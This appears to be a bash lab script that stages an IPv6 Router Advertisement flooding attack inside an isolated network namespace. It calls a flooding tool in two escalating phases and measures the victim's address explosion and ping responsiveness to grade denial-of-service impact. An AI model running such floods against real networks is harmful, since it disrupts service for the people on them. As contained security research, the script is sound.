#!/bin/bash
# Enhanced Safe IPv6 RA Flooding Demo
# Moderate attack to show better DoS impact while maintaining stability

set -e

echo "🚀 ENHANCED SAFE IPv6 RA FLOODING DEMONSTRATION"
echo "=============================================="
echo "Strategy: Moderate attack to show good DoS impact safely"
echo "Goal: Generate 50+ addresses and measure responsiveness"
echo ""

# Create results directory
mkdir -p demo_results_safe

# Simple cleanup function  
cleanup() {
    echo "🧹 Cleaning up safely..."
    pkill -f tcpdump 2>/dev/null || true
    ip netns del victim 2>/dev/null || true
    ip link del veth-attacker 2>/dev/null || true
}
trap cleanup EXIT

# Create network setup
echo "🔧 Setting up safe network isolation..."
ip netns add victim
ip link add veth-attacker type veth peer name veth-victim
ip link set veth-victim netns victim

# Configure interfaces
ip addr add 2001:db8:cafe::1/64 dev veth-attacker
ip link set veth-attacker up

ip netns exec victim ip addr add 2001:db8:cafe::2/64 dev veth-victim
ip netns exec victim ip link set veth-victim up
ip netns exec victim ip link set lo up

# Enable IPv6 autoconfiguration
ip netns exec victim sysctl -w net.ipv6.conf.all.accept_ra=1 >/dev/null
ip netns exec victim sysctl -w net.ipv6.conf.veth-victim.accept_ra=1 >/dev/null
ip netns exec victim sysctl -w net.ipv6.conf.all.autoconf=1 >/dev/null

echo "Network setup complete."

# Start basic packet capture
echo "📡 Starting packet capture..."
tcpdump -i veth-attacker -w demo_results_safe/safe_ra_flood.pcap icmp6 &
TCPDUMP_PID=$!
sleep 1

# Get baseline measurements
BASELINE=$(ip netns exec victim ip -6 addr show dev veth-victim | grep "scope global dynamic" | wc -l)
TOTAL_BASELINE=$(ip netns exec victim ip -6 addr show dev veth-victim | grep "inet6" | wc -l)
echo "📋 Baseline: $BASELINE dynamic addresses, $TOTAL_BASELINE total"

# Test baseline connectivity
echo "🏓 Testing baseline connectivity..."
if ip netns exec victim ping6 -c 1 -W 2 2001:db8:cafe::1 >/dev/null 2>&1; then
    echo "   ✅ Baseline: Network responsive"
    BASELINE_RESPONSIVE=true
else
    echo "   ❌ Baseline: Network issues"
    BASELINE_RESPONSIVE=false
fi

echo ""
echo "🔥 PHASE 1: MODERATE ATTACK - 75 packets (safe rate)"
echo "=================================================="
echo "Goal: Generate significant address explosion safely"

# Moderate attack - safe parameters
time python3 src/ra_flood.py -i veth-attacker -c 75 --threads 2

echo "⏱️  Allowing SLAAC processing..."
sleep 6

AFTER_PHASE1=$(ip netns exec victim ip -6 addr show dev veth-victim | grep "scope global dynamic" | wc -l)
TOTAL_AFTER_PHASE1=$(ip netns exec victim ip -6 addr show dev veth-victim | grep "inet6" | wc -l)
ADDED_PHASE1=$((AFTER_PHASE1 - BASELINE))

echo "📊 After Phase 1: $AFTER_PHASE1 dynamic (+$ADDED_PHASE1), $TOTAL_AFTER_PHASE1 total"

# Test responsiveness after phase 1
echo "🏓 Testing responsiveness after Phase 1..."
if ip netns exec victim ping6 -c 1 -W 3 2001:db8:cafe::1 >/dev/null 2>&1; then
    echo "   ✅ Phase 1: Still responsive"
    PHASE1_RESPONSIVE=true
else
    echo "   ❌ Phase 1: Unresponsive - DoS achieved!"
    PHASE1_RESPONSIVE=false
fi

echo ""
echo "🌊 PHASE 2: SUSTAINED PRESSURE - 100 more packets"
echo "================================================"
echo "Goal: Demonstrate sustained attack capability"

# Sustained attack - still safe
time python3 src/ra_flood.py -i veth-attacker -c 100 --threads 3 --fragment

echo "⏱️  Extended processing time..."
sleep 8

FINAL=$(ip netns exec victim ip -6 addr show dev veth-victim | grep "scope global dynamic" | wc -l)
TOTAL_FINAL=$(ip netns exec victim ip -6 addr show dev veth-victim | grep "inet6" | wc -l)
TOTAL_ADDED=$((FINAL - BASELINE))
ADDED_PHASE2=$((FINAL - AFTER_PHASE1))

echo "📊 After Phase 2: $FINAL dynamic (+$TOTAL_ADDED total), $TOTAL_FINAL total addresses"

# Final responsiveness test
echo "🏓 Testing final responsiveness..."
if ip netns exec victim ping6 -c 2 -W 3 2001:db8:cafe::1 >/dev/null 2>&1; then
    echo "   ✅ Final: Still responsive"
    FINAL_RESPONSIVE=true
else
    echo "   ❌ Final: Unresponsive - Complete DoS!"
    FINAL_RESPONSIVE=false
fi

# Stop capture
kill $TCPDUMP_PID 2>/dev/null || true
sleep 2

echo ""
echo "🎯 ENHANCED SAFE DEMONSTRATION RESULTS"
echo "====================================="
echo "Baseline dynamic addresses: $BASELINE"
echo "Final dynamic addresses: $FINAL"
echo "Total addresses added: $TOTAL_ADDED"
echo "Total IPv6 addresses: $TOTAL_FINAL"

if (( BASELINE == 0 )); then
    echo "Growth: Infinite (0 → $FINAL addresses)"
else
    echo "Growth: $(( (FINAL * 100) / BASELINE ))% increase"
fi

echo ""
echo "🚨 DoS IMPACT ASSESSMENT:"
echo "========================"

if [[ "$FINAL_RESPONSIVE" == false ]]; then
    echo "🔴 VICTIM UNRESPONSIVE - Complete DoS achieved!"
    echo "   ❌ Network requests timing out"
    echo "   📊 Address explosion: $TOTAL_ADDED new addresses"
    echo "   🎯 DoS Status: CRITICAL - Service unavailable"
elif [[ "$PHASE1_RESPONSIVE" == false ]]; then
    echo "🟡 TEMPORARY UNRESPONSIVENESS - Partial DoS"
    echo "   ⚠️  Victim became unresponsive during attack"
    echo "   📊 Address explosion: $TOTAL_ADDED new addresses"
    echo "   🎯 DoS Status: MODERATE - Temporary service disruption"
else
    echo "🟢 VICTIM RESPONSIVE - Attack successful with limited DoS"
    echo "   ✅ Network requests working"
    echo "   📊 Address explosion: $TOTAL_ADDED new addresses"
    echo "   🎯 DoS Status: LOW - Address inflation demonstrated"
fi

echo ""
echo "🎉 ENHANCED SAFE DEMONSTRATION COMPLETE!"
echo "======================================="
echo "Results: $TOTAL_ADDED dynamic addresses generated safely"
echo "System: Stable throughout demonstration"
echo "✅ Ready for security research and academic evaluation"
